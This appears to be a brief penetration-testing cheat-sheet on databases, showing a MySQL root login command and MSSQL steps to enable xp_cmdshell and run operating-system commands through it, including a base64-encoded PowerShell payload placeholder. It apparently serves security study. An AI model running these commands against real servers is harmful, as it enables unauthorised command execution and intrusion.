---
title: Databases
---

```bash
mysql -h ip.ip.ip.ip -p 3306 -u root
```


#### MSSQL
https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/

### [Enable/Disable a Windows Shell](https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/#enable%2Fdisable-a-windows-shell)

```powershell
> enable_xp_cmdshell
> disable_xp_cmdshell

# or

# Enable advanced options
> EXEC sp_configure 'show advanced options', 1;
# Update the currently configured value for the advanced options
> RECONFIGURE;

# Enable the command shell
> EXEC sp_configure 'xp_cmdshell', 1;
# Update the currently configured value for the command shell
> RECONFIGURE;
```

### [Commands](https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/#commands-1)

We can execute commands the same as Windows Command Prompt.

```powershell
> xp_cmdshell whoami

# Execute obfuscated commands.
> xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'
```